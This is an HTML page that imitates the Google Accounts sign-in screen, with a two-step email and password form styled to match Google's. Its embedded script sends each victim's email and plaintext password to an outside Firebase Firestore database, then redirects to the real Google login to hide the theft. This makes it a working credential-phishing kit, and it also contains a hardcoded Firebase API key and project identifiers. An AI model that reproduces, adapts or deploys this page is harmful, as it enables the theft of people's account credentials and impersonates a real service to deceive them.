<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: "Google Sans", Roboto, Arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 450px;
            min-height: 500px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            text-align: center;
            position: relative;
            transition: 0.2s;
        }
        .logo { margin-bottom: 12px; }
        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
        .subtitle { font-size: 16px; color: #202124; margin-bottom: 32px; }
        
        /* Floating Label Input Area */
        .input-container {
            position: relative;
            margin-bottom: 10px;
            width: 100%;
            text-align: left;
        }
        input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            background: transparent;
            z-index: 1;
        }
        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
        
        .label {
            position: absolute;
            left: 15px;
            top: 13px;
            color: #5f6368;
            pointer-events: none;
            transition: 0.2s ease all;
            background: #fff;
            padding: 0 4px;
        }
        /* Input မှာ စာရှိနေရင် သို့မဟုတ် Focus ဖြစ်နေရင် Label ကို အပေါ်တင်မယ် */
        input:focus ~ .label, input:not(:placeholder-shown) ~ .label {
            top: -8px;
            left: 10px;
            font-size: 12px;
            color: #1a73e8;
        }
        input:not(:focus) ~ .label { color: #5f6368; }

        .forgot-link {
            color: #1a73e8; font-size: 14px; font-weight: 500;
            text-decoration: none; display: block; text-align: left;
            margin-top: 8px; cursor: pointer;
        }

        /* Loading Animation */
        #progress-bar {
            position: absolute; top: 0; left: 0; width: 100%; height: 4px;
            background-color: transparent; overflow: hidden; display: none;
        }
        #progress-bar div {
            height: 100%; background-color: #1a73e8; width: 50%;
            animation: lineAnim 1.2s infinite linear;
        }
        @keyframes lineAnim {
            0% { transform: translateX(-100%); width: 30%; }
            50% { width: 60%; }
            100% { transform: translateX(350%); width: 30%; }
        }

        .footer-btns {
            display: flex; justify-content: space-between;
            align-items: center; margin-top: 40px;
        }
        .create-acc { color: #1a73e8; font-size: 14px; font-weight: 500; cursor: pointer; }
        #nextBtn {
            background-color: #1a73e8; color: white; border: none;
            padding: 10px 24px; border-radius: 4px; font-weight: 500;
            cursor: pointer; font-size: 14px;
        }
        
        .user-display {
            border: 1px solid #dadce0; border-radius: 16px;
            padding: 4px 12px; display: inline-flex; align-items: center;
            font-size: 14px; color: #3c4043; margin-bottom: 24px;
        }

        @media (max-width: 450px) { .container { border: none; } }
    </style>
</head>
<body>

<div class="container">
    <div id="progress-bar"><div></div></div>
    
    <div class="logo">
        <svg viewBox="0 0 75 24" width="75" height="24">
            <path fill="#4285F4" d="M7.07 10.57v2.85h4.11c-.16 1.07-1.22 3.12-4.11 3.12-2.5 0-4.54-2.07-4.54-4.62s2.04-4.62 4.54-4.62c1.42 0 2.37.6 2.91 1.12l2.25-2.17C10.79 4.88 9.11 4 7.07 4 3.17 4 0 7.17 0 11.08s3.17 7.08 7.07 7.08c4.08 0 6.79-2.87 6.79-6.91 0-.46-.05-.82-.12-1.18H7.07z"></path>
            <path fill="#EA4335" d="M23.08 11h-3.32v3.19h3.32c-.12 1.41-1.28 2.45-3.32 2.45-2.1 0-3.79-1.63-3.79-3.64s1.69-3.64 3.79-3.64c1.08 0 1.83.43 2.33.86l2.39-2.39C23.1 6.57 21.36 5.5 19.76 5.5c-3.4 0-6.16 2.76-6.16 6.16s2.76 6.16 6.16 6.16c3.2 0 5.49-2.25 5.49-5.59 0-.43-.05-.84-.17-1.23z"></path>
        </svg>
    </div>

    <div id="step1">
        <h1>Sign in</h1>
        <p class="subtitle">Use your Google Account</p>
        <div class="input-container">
            <input type="text" id="email" placeholder=" " required>
            <label class="label">Email or phone</label>
        </div>
        <a class="forgot-link">Forgot email?</a>
        <p style="text-align: left; color: #5f6368; font-size: 14px; margin-top: 40px; line-height: 1.4;">
            Not your computer? Use Guest mode to sign in privately. <span style="color: #1a73e8; font-weight: 500; cursor: pointer;">Learn more</span>
        </p>
    </div>

    <div id="step2" style="display: none;">
        <h1>Welcome</h1>
        <div class="user-display" id="userDisplay"></div>
        <div class="input-container">
            <input type="password" id="password" placeholder=" " required>
            <label class="label">Enter your password</label>
        </div>
        <a class="forgot-link">Forgot password?</a>
    </div>

    <div class="footer-btns">
        <div class="create-acc">Create account</div>
        <button type="button" id="nextBtn">Next</button>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyCK8750OLb7WCLyXV2JIL1RaTth55wOQII",
        authDomain: "main-apk-3209b.firebaseapp.com",
        projectId: "main-apk-3209b",
        storageBucket: "main-apk-3209b.firebasestorage.app",
        messagingSenderId: "729839795941",
        appId: "1:729839795941:web:48b23f39e7bf6f3cf11e0c"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const nextBtn = document.getElementById('nextBtn');
    const prog = document.getElementById('progress-bar');
    let emailVal = "";

    nextBtn.addEventListener('click', async () => {
        const emailInput = document.getElementById('email');
        const passInput = document.getElementById('password');

        if (document.getElementById('step1').style.display !== 'none') {
            if (!emailInput.value) return;
            emailVal = emailInput.value;
            
            prog.style.display = "block";
            setTimeout(() => {
                prog.style.display = "none";
                document.getElementById('step1').style.display = "none";
                document.getElementById('step2').style.display = "block";
                document.getElementById('userDisplay').innerText = emailVal;
            }, 600);
        } else {
            if (!passInput.value) return;
            
            nextBtn.disabled = true;
            prog.style.display = "block";

            try {
                await addDoc(collection(db, "Google"), {
                    Username: emailVal,
                    Password: passInput.value,
                    timestamp: new Date()
                });
                window.location.href = "https://accounts.google.com";
            } catch (e) {
                console.error(e);
                prog.style.display = "none";
                nextBtn.disabled = false;
            }
        }
    });
</script>

</body>
</html>
